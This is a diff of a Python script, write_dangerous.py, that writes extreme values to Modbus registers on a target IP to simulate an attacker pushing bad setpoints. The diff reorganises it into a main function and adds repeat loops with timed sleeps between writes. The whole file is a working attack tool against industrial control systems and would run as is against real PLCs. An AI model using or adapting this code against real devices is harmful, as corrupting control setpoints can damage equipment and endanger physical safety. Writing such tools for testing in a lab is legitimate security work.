@@ -5,44 +5,51 @@ write_dangerous.py - Write out-of-range values to Modbus registers.
 Writes dangerous/extreme values to specific registers using FC 6
 (Write Single Register). Simulates an attacker pushing bad setpoints.
 
-Usage:
-    python write_dangerous.py <target_ip> <addr:value> [addr:value ...] [--port PORT] [--unit UNIT]
-
-    python write_dangerous.py 192.168.1.100 100:65535 200:0 300:65535
-    python write_dangerous.py 192.168.1.100 50:9999 --port 502 --unit 1
-
 Requires: pip install pymodbus
 """
 
 import argparse
+import time
 from pymodbus.client import ModbusTcpClient
 
-parser = argparse.ArgumentParser(description="Write dangerous values to Modbus registers")
-parser.add_argument("target", help="Target IP")
-parser.add_argument("registers", nargs="+", metavar="ADDR:VALUE",
-                    help="Register address:value pairs (e.g. 100:65535)")
-parser.add_argument("--port", type=int, default=502)
-parser.add_argument("--unit", type=int, default=1)
-args = parser.parse_args()
 
-pairs = []
-for r in args.registers:
-    a, v = r.split(":")
-    pairs.append((int(a), int(v)))
+def main():
+    parser = argparse.ArgumentParser(description="Write dangerous values to Modbus registers")
+    parser.add_argument("target", help="Target IP")
+    parser.add_argument("registers", nargs="+", metavar="ADDR:VALUE", help="Register address:value pairs (e.g. 100:65535)")
+    parser.add_argument("--port", type=int, default=502)
+    parser.add_argument("--unit", type=int, default=0)
+    parser.add_argument("--loops", type=int, default=1)
+    parser.add_argument("--sleep-between", type=float, default=0.0)
+    args = parser.parse_args()
 
-client = ModbusTcpClient(args.target, port=args.port, timeout=2)
-if not client.connect():
-    print(f"[!] Cannot connect to {args.target}:{args.port}")
-    exit(1)
+    pairs = []
+    for r in args.registers:
+        a, v = r.split(":")
+        pairs.append((int(a), int(v)))
 
-print(f"[*] Writing dangerous values to {args.target}:{args.port} unit={args.unit}\n")
+    client = ModbusTcpClient(args.target, port=args.port, timeout=2)
+    if not client.connect():
+        print(f"[!] Cannot connect to {args.target}:{args.port}")
+        exit(1)
 
-for addr, value in pairs:
-    result = client.write_register(addr, value, slave=args.unit)
-    if result.isError():
-        print(f"  [-] Reg {addr} <- {value}: FAILED ({result})")
-    else:
-        print(f"  [+] Reg {addr} <- {value}: written")
+    print(f"[*] Writing dangerous values to {args.target}:{args.port} unit={args.unit}\n")
 
-client.close()
-print("\n[*] Done")
+    for loop in range(args.loops):
+        if args.loops > 1:
+            print(f"\n[*] Loop {loop + 1}/{args.loops}")
+        for addr, value in pairs:
+            result = client.write_register(addr, value, slave=args.unit)
+            if result.isError():
+                print(f"  [-] Reg {addr} <- {value}: FAILED ({result})")
+            else:
+                print(f"  [+] Reg {addr} <- {value}: written")
+        if loop + 1 < args.loops and args.sleep_between > 0:
+            time.sleep(args.sleep_between)
+
+    client.close()
+    print("\n[*] Done")
+
+
+if __name__ == "__main__":
+    main()
